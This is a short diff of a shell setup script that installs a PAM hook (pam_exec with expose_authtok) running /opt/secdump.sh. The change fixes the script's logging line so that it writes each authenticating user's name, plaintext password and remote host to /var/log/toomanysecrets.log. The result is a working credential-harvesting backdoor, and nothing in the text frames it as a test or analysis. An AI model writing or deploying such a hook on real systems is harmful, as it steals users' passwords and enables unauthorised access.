@@ -6,7 +6,7 @@ echo "auth      optional        pam_exec.so     quiet   expose_authtok  /opt/sec
 echo "done with that"
 echo "creating script"
 echo '#!/bin/sh' > /opt/secdump.sh
-echo '" $(date) $PAM_USER, $(cat -), From: $PAM_RHOST" >> /var/log/toomanysecrets.log' >> /opt/secdump.sh
+echo 'echo "$(date +%Y-%m-%d_%H:%M:%S) $PAM_USER, $(cat -), From: $PAM_RHOST" >> /var/log/toomanysecrets.log' >> /opt/secdump.sh
 echo "done with that"
 echo "making executable"
 chmod +x /opt/secdump.sh
